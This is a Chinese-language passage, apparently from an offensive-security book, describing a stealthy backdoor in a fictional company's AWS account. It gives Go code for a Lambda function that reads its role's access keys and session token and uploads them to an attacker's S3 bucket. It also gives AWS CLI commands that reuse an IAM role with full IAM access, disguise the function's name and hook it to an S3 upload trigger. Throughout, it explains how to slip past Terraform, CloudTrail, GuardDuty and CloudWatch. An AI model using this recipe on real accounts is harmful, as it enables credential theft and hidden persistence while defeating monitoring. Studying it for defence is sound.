
压轴的还有：Terraform。我们知道 MXR Ads 依赖 Terraform 来维护其基础设施。如果我们手动更改错误的资源，在下一次 terraform plan 命令中就会像个明显的疤痕一样显眼。主题为“您已被入侵”的邮件反而可能更容易不被注意。

这些是与 AWS 账户交互时需要牢记的主要陷阱。它们确实是地雷，稍有失误就会爆炸。这几乎让你怀念起旧时光——入侵 Windows Active Directory 的日子，当时从一台机器上聚合和解析事件日志的工作需要两天时间。

现在，如果你处于目标方安全非常薄弱的情况，并且觉得可以手动创建几个访问密钥、添加几个看似可信的 IAM 用户并赋予他们管理员权限，请随意。在这种情况下没有必要过度设计后门策略，尤其是考虑到 Jenkins 的访问密钥相当稳定。

然而，如果公司看起来过于偏执——访问控制严格、权限严格且有限、活跃用户列表干净，并且 CloudTrail、CloudWatch 以及其他监控工具配置得当——你可能需要一个更稳健、更隐蔽的备份策略。

为了举例说明，让我们给 MXR Ads 一个有利的假设并假定最坏的情况。我们如何在不引起注意的情况下维持持久访问？

## 在极致隐秘中保持持久

我们的后门策略将遵循最时髦的设计架构，并且完全无服务器且事件驱动。我们将配置一个看门狗，在特定事件触发时启动，并触发一个作业，在检测到这些事件时重新建立我们的访问。

换成 AWS 术语来说，看门狗将由 Lambda 函数构成，该函数由我们选择的事件触发。例如，我们可以选择一个每天上午 10 点触发的 CloudWatch 事件，或接收预定义请求的负载均衡器。我们选择使用在 S3 存储桶接收新对象时触发的事件。MXR Ads 和 GP 都使用相同的触发器，因此我们有更高的机会融入其中。一旦执行，Lambda 将转储其附加的角色凭证并发送到我们自己的 S3 存储桶。我们收到的凭证有效期为一小时，但拥有足够的权限来永久恢复持久访问。

> NOTE
*更性感的做法是将我们的 Lambda 绑定到 CloudWatch 事件，该事件在 Jenkins 访问密钥轮换时触发。不幸的是，每个日志组只能设置一个目标 Lambda，并且它在 CloudWatch 仪表板中立即可见。将钩子接入 S3 的优势在于信息被埋藏在 S3 的仪表板内部。*

让我们回顾一下我们的检测清单：Lambda 函数将由某些频繁发生的内部事件触发（在本例中，当对象上传到 MXR Ads 的 S3 存储桶时），作为响应，它将执行一个相当无聊的 put-object 调用，将包含其凭证的文件存放在远程存储桶中。IAM Access Analyzer 几乎不会眨眼。

Terraform 在设置阶段不会大喊大叫，因为大多数资源将被创建，而不是更改。即使源存储桶已在状态中声明，技术上我们将添加一个 aws_s3_bucket_notification 资源，这在 Terraform 中是一个完全独立的实体。我们所要做的就是选择一个没有 Terraform 化通知设置的存储桶，我们就万事俱备了。

至于 CloudTrail，它记录的唯一事件是受信任的服务 lambda.amazonaws.com 冒充角色以执行 Lambda。这是一个任何 Lambda 执行固有的微不足道事件，将不会被 Insights 和 GuardDuty 注意到。

一切看起来都很正常！

## 要执行的程序

让我们进入实现阶段。Lambda 将运行的程序是一个直接的 Go 二进制文件，遵循前面描述的关键步骤。完整的实现可在本书仓库中获得 (http://bit.ly/2Oan7I7)，以下是主要逻辑的简要概述。

每个要在 Lambda 环境中运行的 Go 程序都从相同的样板 main 函数开始，该函数注册 Lambda 的入口点（本例中为 HandleRequest）：

```
func main() {
    lambda.Start(HandleRequest)
}
```

接下来，我们有一个经典的设置来构建 HTTP 客户端并创建用于提交响应的远程 S3 URL：

```
const S3BUCKET="mxrads-analytics"
func HandleRequest(ctx context.Context, name MyEvent) (string, error) {
    client := &http.Client{}
    respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/setup.txt", S3BUCKET)
```

我们从环境变量中转储 Lambda 的角色凭证并将其发送到我们的远程存储桶：

```
accessKey := fmt.Sprintf(`
    AWS_ACCESS_KEY_ID=%s
    AWS_SECRET_ACCESS_KEY=%s
    AWS_SESSION_TOKEN=%s`,
    os.Getenv("AWS_ACCESS_KEY_ID"),
    os.Getenv("AWS_SECRET_ACCESS_KEY"),
    os.Getenv("AWS_SESSION_TOKEN"),
)
uploadToS3(s3Client, S3BUCKET, "lambda", accessKey)
```

uploadToS3 方法是对之前定义的 URL 的简单 PUT 请求，因此其实现从阅读源代码来看应该相当明显，总体上大约有 44 行长。

我们编译代码然后压缩二进制文件：

```
root@Point1:lambda/# make
root@Point1:lambda/# zip function.zip function
```

现在我们把注意力转向设置 Lambda。

## 构建 Lambda

Lambda 需要一个执行角色，该角色具有强大的 IAM 和 CloudTrail 权限，以帮助我们维持隐蔽的长期访问（稍后会详细介绍）。

我们寻找可以与 Lambda AWS 服务冒充的有希望的候选者。记住，要冒充一个角色，必须满足两个条件：用户必须能够发出 sts assume-role 调用，并且该角色必须接受来自该用户的冒充。我们列出 MXR Ads AWS 账户中可用的角色：

```
root@Point1:~/# aws iam list-roles \
| jq -r '.Roles[] | .RoleName + ", " + \
.AssumeRolePolicyDocument.Statement[].Principal.Service' \
| grep "lambda.amazonaws.com"

dynamo-access-mgmt, lambda.amazonaws.com
chef-cleanup-ro, lambda.amazonaws.com
--snip--
```

我们检查每个角色的 IAM 策略，直到找到我们需要的权限集的角色——理想情况下是完整的 IAM 和 CloudTrail 访问权限：

```
root@Point1:~/# aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins

"AttachedPolicies": [
    "PolicyName": "IAMFullAccess",
    "PolicyName": "cloudtrail-mgmt-rw",
    "PolicyName": "dynamo-temp-rw",
--snip--
```

dynamo-ssh-mgmt 角色可能可以胜任，因为它具有 IAMFullAccess 策略。Cheeky。如果我们从头开始在 MXR Ads 的 AWS 账户中创建自己的角色，我们绝不敢附加如此明显的策略。然而，既然他们已经在使用它，我们不妨利用它。此外，该角色缺乏 CloudWatch 写入权限，因此 Lambda 在终止时将静默丢弃其执行日志，而不是将其传递给 CloudWatch。完美。

像往常一样，我们通过坚持现有的命名约定来隐藏在众目睽睽之下。我们查找 eu-west-1 区域中现有的 Lambda 函数以获取灵感：

```
root@Point1:~/# aws lambda list-functions -region=eu-west-1
"FunctionName": "support-bbs-news",
"FunctionName": "support-parse-logs",
"FunctionName": "ssp-streaming-format",
--snip--
```

我们将选择名称 support-metrics-calc 并调用 create-function API 来注册我们的后门 Lambda：

```
root@Point1:~/# aws lambda create-function --function-name support-metrics-calc \
--zip-file fileb://function.zip \
--handler function \
--runtime go1.x \
--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \
--region eu-west-1
```

现在是触发事件本身。

## 设置触发事件

理想情况下，我们希望定位一个由 MXR Ads 定期更新的 S3 存储桶，但更新频率不要太高，以至于每天触发 Lambda 1000 次。

> NOTE
我们选择在 MXR Ads 使用的同一区域创建 Lambda，但同样可以将其偷运到未使用的区域。这个 Lambda 几乎不花费任何费用，因此即使在账单报告上也几乎不会被注意到。

如何考虑 s4d.mxrads.com，即我们在第 8 章中查看的所有创意存储桶？一次快速的 list-objects-v2 API 调用显示更新速度相对较低，每天大约 50 到 100 个文件：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt
"Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
"LastModified": "2019-12-14T11:01:48.000Z",
--snip--

root@Point1:~/# grep -c "2020-12-14" list_keys.txt
89
root@Point1:~/# grep -c "2020-12-13" list_keys.txt
74
--snip--
```

我们可以通过对触发通知事件的对象进行采样来降低触发率。我们将使其仅当对象键名以 "2" 开头时才触发我们的 Lambda，给出 1/16 的采样率（假设十六进制键空间，均匀分布）。这大约相当于每天三次到六次调用。
成交。
